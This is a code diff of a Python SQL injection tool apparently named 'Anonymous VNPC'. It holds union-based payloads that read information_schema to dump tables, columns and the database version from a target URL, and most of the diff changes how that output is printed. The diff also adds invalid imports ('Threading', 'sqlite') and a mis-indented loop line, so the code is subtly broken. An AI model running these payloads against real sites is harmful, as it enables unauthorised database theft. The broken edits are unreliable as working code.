@@ -1,11 +1,13 @@
 # done
+# Anonymous VNPC
 import requests
 import argparse
 import time
 import re
 import os
 import socket
-import threading
+import Threading
+import sqlite
 from bs4 import BeautifulSoup
 
 def banner():
@@ -767,13 +769,12 @@ if target_url:
                                         print("------------------")
                                         print("| table | column |")
                                         print("------------------")
-                                        for database_table in database_all:
+                                       for database_table in database_all:
                                             print(f"[INFO] fetching database on {dbs} ", database_table)
                                             time.sleep(0.30)
-                                        for dbmss in database_table:
-                                            print('-------------------------')
-                                            print(database, end=" | ")
-                                            print('-------------------------')
+                                        print("----------------------")
+                                        print(f"| {database_all} |")
+                                        print("-----------------------")
                                         payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',column_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.columns)"
                                         rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
                                         results_get_queries = requests.get(target_url + rm)
@@ -789,10 +790,9 @@ if target_url:
                                         for database in database_all:
                                             print(f"[]fetching columns on table {database_table} in database : ", database)
                                             time.sleep(0.30)
-                                        for dbmss in database:
-                                            print('-------------------------')
-                                            print(database, end=" | ")
-                                            print('-------------------------')
+                                        print("----------------------")
+                                        print(f"| {database_all} |")
+                                        print("-----------------------")
                                         payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.tables)"
                                         rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
                                         results_get_queries = requests.get(target_url + rm)
@@ -806,12 +806,11 @@ if target_url:
                                         print("| table | column |")
                                         print("------------------")
                                         for database in database_all:
-                                            print(f"[INFO] fetching database on {dbs}", database)
+                                            print(f"[INFO] fetching database on {dbs} {database}")
                                             time.sleep(0.30)
-                                        for dbmss in database:
-                                            print('-------------------------')
-                                            print(database, end=" | ")
-                                            print('-------------------------')
+                                        print("----------------------")
+                                        print(f"| {database_all} |")
+                                        print("-----------------------")
                                         exit()
                                     else:
                                         print("[INFO] Testing Count Columns : {}".format(num_countss))
@@ -1541,10 +1540,9 @@ if target_url:
                                         for database_table in database_all:
                                             print(f"[INFO] fetching database on {dbs} ", database_table)
                                             time.sleep(0.30)
-                                        for dbmss in database_table:
-                                            print('-------------------------')
-                                            print(database, end=" | ")
-                                            print('-------------------------')
+                                        print("----------------------")
+                                        print(f"| {database_all} |")
+                                        print("-----------------------")
                                         payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',column_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.columns)"
                                         rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
                                         results_get_queries = requests.get(target_url + rm)
@@ -1560,10 +1558,9 @@ if target_url:
                                         for database in database_all:
                                             print(f"[]fetching columns on table {database_table} in database : ", database)
                                             time.sleep(0.30)
-                                        for dbmss in database:
-                                            print('-------------------------')
-                                            print(database, end=" | ")
-                                            print('-------------------------')
+                                        print("----------------------")
+                                        print(f"| {database_all} |")
+                                        print("-----------------------")
                                         payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.tables)"
                                         rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
                                         results_get_queries = requests.get(target_url + rm)
@@ -1577,12 +1574,11 @@ if target_url:
                                         print("| table | column |")
                                         print("------------------")
                                         for database in database_all:
-                                            print(f"[INFO] fetching database on {dbs}", database)
+                                            print(f"[INFO] fetching database on {dbs} {database}")
                                             time.sleep(0.30)
-                                        for dbmss in database:
-                                            print('-------------------------')
-                                            print(database, end=" | ")
-                                            print('-------------------------')
+                                        print("----------------------")
+                                        print(f"| {database_all} |")
+                                        print("-----------------------")
                                         exit()
                                     else:
                                         print("[INFO] Testing Count Columns : {}".format(num_countss))
